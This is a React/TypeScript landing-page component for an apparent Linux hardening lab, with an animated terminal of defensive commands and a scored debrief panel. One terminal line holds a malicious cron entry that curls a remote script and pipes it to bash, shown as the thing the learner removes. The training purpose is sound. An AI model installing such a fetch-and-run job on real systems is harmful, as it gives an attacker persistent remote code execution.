"use client";

import { useEffect, useRef, useState } from "react";
import { Check, Minus, X } from "lucide-react";

import { cn } from "@roundzero/ui";

/** Runs `onEnter` once, the first time the element is scrolled into view.
 * Same mechanism as Reveal, but for driving an animation rather than
 * fading a wrapper — kept separate so Reveal stays a pure presentational
 * wrapper with no callbacks. */
function useInView<T extends HTMLElement>(onEnter: () => void) {
  const ref = useRef<T>(null);
  const fired = useRef(false);

  useEffect(() => {
    const node = ref.current;
    if (!node) return;
    const observer = new IntersectionObserver(
      (entries) => {
        for (const entry of entries) {
          if (entry.isIntersecting && !fired.current) {
            fired.current = true;
            onEnter();
            observer.disconnect();
          }
        }
      },
      { rootMargin: "0px 0px -20% 0px", threshold: 0.2 },
    );
    observer.observe(node);
    return () => observer.disconnect();
  }, [onEnter]);

  return ref;
}

/**
 * One pass over the machine the debrief below then grades: find the UID-0
 * backdoor, close root SSH, fix the world-writable passwd file, pull the
 * malicious cron. The four findings deliberately match `SCORE_ROWS` — the two
 * panels on this page used to depict unrelated scenarios, which quietly
 * undercut the claim that the debrief is about what you just did.
 *
 * Every line is real and every line is short enough not to wrap at the
 * panel's width. `sudoedit` rather than a long `sed -i` for that reason: the
 * wrapped version needed a fake PS2 continuation to look right.
 */
const TERMINAL_LINES = [
  { prompt: true, text: "sudo awk -F: '$3==0 {print $1}' /etc/passwd" },
  { prompt: false, text: "root" },
  { prompt: false, text: "backdoor" },
  { prompt: true, text: "sudo usermod -u 1005 backdoor" },
  { prompt: true, text: "grep -E '^PermitRootLogin' /etc/ssh/sshd_config" },
  { prompt: false, text: "PermitRootLogin yes" },
  { prompt: true, text: "sudoedit /etc/ssh/sshd_config" },
  { prompt: true, text: "sudo systemctl reload ssh" },
  { prompt: true, text: "sudo find / -perm -0002 -type f 2>/dev/null" },
  { prompt: false, text: "/etc/passwd" },
  { prompt: true, text: "sudo chmod 644 /etc/passwd" },
  { prompt: true, text: "sudo crontab -l -u www-data" },
  { prompt: false, text: "*/5 * * * * curl -s http://198.51.100.23/x.sh | bash" },
  { prompt: true, text: "sudo crontab -r -u www-data" },
];

/**
 * How much of the session is already on screen before anything animates.
 *
 * Two reasons it isn't zero. With JavaScript off — a throttled school
 * Chromebook, a crawler — the old version rendered an empty bordered box,
 * the same failure as the Reveal bug next door. And with JavaScript on, a
 * panel this tall that starts empty spends its first second looking broken;
 * a terminal you glance at has scrollback already.
 */
const PRELOADED_LINES = 8;

/**
 * A terminal typing itself out. Not a video and not a screenshot — the real
 * commands from the Linux track, so what someone sees on the landing page is
 * literally what they will type in the lab.
 */
export function TerminalDemo() {
  const [visibleLines, setVisibleLines] = useState(PRELOADED_LINES);
  const ref = useInView<HTMLDivElement>(() =>
    setVisibleLines((n) => Math.min(n + 1, TERMINAL_LINES.length)),
  );

  useEffect(() => {
    if (visibleLines <= PRELOADED_LINES || visibleLines >= TERMINAL_LINES.length) {
      return;
    }
    // Prompts get typing time; their output does not, because output doesn't
    // get typed. Same total as one flat 160ms cadence, but it reads as a
    // person working rather than as a ticker.
    const delay = TERMINAL_LINES[visibleLines]!.prompt ? 240 : 60;
    const timer = setTimeout(() => setVisibleLines((n) => n + 1), delay);
    return () => clearTimeout(timer);
  }, [visibleLines]);

  return (
    <div
      ref={ref}
      className="flex h-full flex-col overflow-hidden rounded-md border border-hairline bg-surface"
    >
      <div className="flex shrink-0 items-center justify-between border-b border-hairline px-4 py-2.5">
        <span className="font-mono text-[11px] uppercase tracking-[0.14em] text-text-dim">
          linux-practice
        </span>
        <span className="font-mono text-[11px] text-text-dim">root@lab</span>
      </div>
      {/* justify-end: the frame is as tall as the hero's text column, and a
          real shell fills from the bottom. Anything else would leave the
          output stranded at the top of an empty box. min-h covers the
          single-column layout, where there is no sibling to match. */}
      <div className="flex min-h-[188px] flex-1 flex-col justify-end space-y-1 p-4 font-mono text-[13px] leading-[20px]">
        {TERMINAL_LINES.slice(0, visibleLines).map((line, index) => (
          <p
            key={index}
            className={cn(
              "animate-[fadeIn_240ms_ease-out]",
              line.prompt ? "text-text" : "text-text-dim",
            )}
          >
            {/* Not --score: green means "check passed" everywhere else in
                this product, and a shell prompt is decoration. */}
            {line.prompt && <span className="text-accent">$ </span>}
            {line.text}
          </p>
        ))}
        {visibleLines > 0 && visibleLines < TERMINAL_LINES.length && (
          // self-start, because the column is a flex container now: without
          // it the cursor stretches across the full width of the frame and
          // reads as a loading bar rather than a caret.
          <span className="h-[14px] w-[7px] shrink-0 translate-y-0.5 animate-pulse self-start bg-text" />
        )}
      </div>
    </div>
  );
}

/**
 * Every row here is a REAL check from `agent/checks/linux-practice.yaml`,
 * with its real point value, and the three "found" rows are the three graded
 * things the terminal above actually does.
 *
 * It did not start that way, and the old version is worth naming so it isn't
 * reintroduced: it advertised "World-writable /etc/passwd fixed" (no such
 * check exists) and "Firewall left inactive" — a check that was deliberately
 * REMOVED in DECISIONS 045, because gVisor exposes no netfilter and so no
 * learner action could ever make it pass. Inventing plausible-sounding
 * scoring on a marketing page is the one lie a competitor is certain to
 * catch, since they will compare it to what their coach told them.
 *
 * The two "missed" rows are things the session above never attempted. That
 * is the argument the whole page is making: a debrief is worth something
 * precisely because it names what you didn't do.
 *
 * Sources, in order: uid0-backdoor, ssh-permitrootlogin, pwhistory-remember,
 * cron-user-payload, insecure-service-absent. 52 points, 34 earned.
 */
const SCORE_ROWS = [
  { state: "found", title: "Second UID-0 account removed", points: 12 },
  { state: "found", title: "Root SSH login disabled", points: 12 },
  { state: "missed", title: "Password reuse not prevented", points: 8 },
  { state: "found", title: "Malicious user cron removed", points: 10 },
  { state: "missed", title: "Telnet still installed", points: 10 },
] as const;

/** Sum of the rows shown, not the lab's real total — a panel that displays
 * five checks may not quote a denominator it isn't showing. */
const SCORE_TOTAL = SCORE_ROWS.reduce((sum, row) => sum + row.points, 0);

/**
 * The debrief, resolving one line at a time.
 *
 * This is the section that has to land, because `CLAUDE.md` opens with "the
 * debrief is the product" — the pitch is not that you get a lab, it is that
 * you find out exactly what you missed and why.
 *
 * Green and red here are `--score` and `--penalty` used for their actual
 * scoring meaning, which is the one use DESIGN.md permits. They are never
 * decoration on this page either.
 *
 * Preloaded for the same reason `TerminalDemo` is, and caught the same way:
 * reading the deployed page's text instead of screenshotting it. Starting at
 * zero meant the server rendered `Debrief 0 / 52` above five rows sitting at
 * `opacity-0` — so a crawler indexed a score of zero next to a list of passed
 * checks, and anyone without JavaScript got an empty panel with a zero in it.
 * That is the flaw `Reveal` next door has a three-paragraph comment about,
 * reproduced one component over. Two rows render statically,
 * which is a coherent partial debrief rather than a contradictory empty one.
 */
const PRELOADED_ROWS = 2;

export function DebriefDemo() {
  const [revealed, setRevealed] = useState(PRELOADED_ROWS);
  const ref = useInView<HTMLDivElement>(() =>
    setRevealed((n) => Math.min(n + 1, SCORE_ROWS.length)),
  );

  useEffect(() => {
    if (revealed <= PRELOADED_ROWS || revealed >= SCORE_ROWS.length) return;
    // 340ms per row meant 1.7s before the card was whole, and because every
    // row is already in the DOM at opacity-0 the panel is full height the
    // entire time — so mid-scroll it read as a broken box with a void under
    // it. Fast enough now that the card fills before it has been looked at.
    const timer = setTimeout(() => setRevealed((n) => n + 1), 130);
    return () => clearTimeout(timer);
  }, [revealed]);

  const earned = SCORE_ROWS.slice(0, revealed)
    .filter((row) => row.state === "found")
    .reduce((sum, row) => sum + row.points, 0);

  return (
    <div ref={ref} className="rounded-md border border-hairline bg-surface">
      <div className="flex items-baseline justify-between border-b border-hairline px-5 py-4">
        <p className="text-[13px] text-text-dim">Debrief</p>
        <p className="font-mono text-[25px] font-semibold leading-[32px] tabular-nums text-text">
          {earned}
          <span className="text-[13px] font-normal text-text-dim">
            {" "}
            / {SCORE_TOTAL}
          </span>
        </p>
      </div>
      <ul className="divide-y divide-hairline">
        {SCORE_ROWS.map((row, index) => {
          const shown = index < revealed;
          const found = row.state === "found";
          return (
            <li
              key={row.title}
              className={cn(
                "flex items-center gap-3 px-5 py-3 transition-all duration-500 ease-[cubic-bezier(0.2,0,0,1)]",
                shown ? "opacity-100" : "motion-safe:translate-x-1 opacity-0",
              )}
            >
              <span
                className={cn(
                  "flex size-5 shrink-0 items-center justify-center rounded-[3px]",
                  !shown && "bg-surface-2",
                  shown && found && "bg-score/15 text-score",
                  shown && !found && "bg-penalty/15 text-penalty",
                )}
              >
                {!shown ? (
                  <Minus className="size-3" strokeWidth={1.75} aria-hidden="true" />
                ) : found ? (
                  <Check className="size-3.5" strokeWidth={2} aria-hidden="true" />
                ) : (
                  <X className="size-3.5" strokeWidth={2} aria-hidden="true" />
                )}
              </span>
              <span className="flex-1 text-sm text-text">{row.title}</span>
              <span
                className={cn(
                  "font-mono text-[13px] tabular-nums",
                  found ? "text-score" : "text-text-dim",
                )}
              >
                {found ? `+${row.points}` : `0/${row.points}`}
              </span>
            </li>
          );
        })}
      </ul>
    </div>
  );
}
